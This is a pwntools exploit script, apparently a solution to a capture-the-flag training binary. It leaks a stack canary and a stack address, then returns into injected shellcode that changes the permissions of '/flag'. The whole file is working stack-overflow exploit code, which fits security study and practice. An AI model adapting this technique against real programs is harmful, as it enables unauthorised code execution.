from pwn import *

p = process("toddlerone-level-5-1")

offset_to_value = 0x58
offset_to_canary = 0x68
offset_to_return = 0x78

offset_from_leak_to_input = 0x1180

the_value = 0x7FDD8FE3C59EAB36

shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x2f\x2f\x66\x6c\x61\x67\x53\x48\x89\xe7\x6a\x04\x5e\x6a\x5a\x58\x0f\x05"

print(p.clean())

payload = b""
payload += shellcode
payload += b"REPEAT"
payload += b"A" * (offset_to_value - len(payload))
payload += p64(the_value)
payload += b"B" * (offset_to_canary - len(payload))
payload += b"C"

p.sendline(b"500")
p.send(payload)

x = p.clean()
print(x)
leaked_data = [int.from_bytes(b, 'little') for m in re.findall(rb'(?s)(.{7})(.{5}\x7f)', x) for b in m]

leaked_canary = leaked_data[2]
leaked_canary = leaked_canary << 8

leaked_stack = leaked_data[3]

print("[+] Leaked Canary :: ", hex(leaked_canary))
print("[+] Leaked stack :: ", hex(leaked_stack))

print(p.clean())

payload = b""
payload += shellcode
payload += b"\x90" * (offset_to_value - len(payload))
payload += p64(the_value)
payload += b"\x90" * (offset_to_canary - len(payload))
payload += p64(leaked_canary)
payload += b"\x90" * (offset_to_return - len(payload))
payload += p64(leaked_stack - offset_from_leak_to_input)

p.sendline(b"500")
p.send(payload)

print(p.clean())

p.close()
